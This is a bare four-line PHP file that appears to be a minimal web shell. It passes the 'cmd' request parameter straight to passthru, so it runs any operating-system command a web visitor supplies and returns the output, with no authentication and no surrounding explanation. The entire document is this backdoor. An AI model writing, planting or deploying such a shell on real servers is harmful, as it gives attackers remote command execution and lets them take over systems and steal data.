<?php
if (isset($_REQUEST['cmd'])) {
    passthru($_REQUEST['cmd']);
}
